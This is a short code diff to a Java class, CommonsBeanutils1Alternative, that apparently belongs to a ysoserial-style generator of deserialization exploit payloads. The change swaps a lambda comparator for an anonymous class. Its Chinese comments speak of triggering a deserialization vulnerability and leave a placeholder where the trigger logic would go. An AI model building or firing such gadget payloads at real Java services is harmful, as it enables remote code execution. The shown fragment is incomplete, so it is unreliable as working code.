@@ -41,8 +41,17 @@ public class CommonsBeanutils1Alternative implements ObjectPayload<Serializable>
         @SuppressWarnings("unchecked")
         SortedSet<Object> checkedSet = Collections.checkedSortedSet(treeSet, Object.class);
 
+        // 使用匿名内部类代替Lambda表达式
+        Comparator<Object> anonymousComparator = new Comparator<Object>() {
+            @Override
+            public int compare(Object o1, Object o2) {
+                // 这里可以添加触发漏洞的逻辑
+                return 0; // 始终返回0，使得所有元素都被视为相等
+            }
+        };
+
         // 通过反射设置字段，触发反序列化漏洞
-        Reflections.setFieldValue(checkedSet, "comparator", (Comparator<Object>) (o1, o2) -> 0);
+        Reflections.setFieldValue(checkedSet, "comparator", anonymousComparator);
 
         return checkedSet;
     }
